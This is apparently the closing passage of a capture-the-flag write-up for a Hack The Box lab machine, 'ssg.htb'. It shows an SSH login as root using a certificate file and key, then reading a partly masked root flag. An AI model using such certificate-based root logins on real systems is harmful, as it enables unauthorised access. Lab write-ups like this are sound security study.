ssh -o CertificateFile=root.cert -i root root@ssg.htb -p 2222
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
...
root@ssg:~# cat root.txt 
b7b69b050f0d7-------------------
```


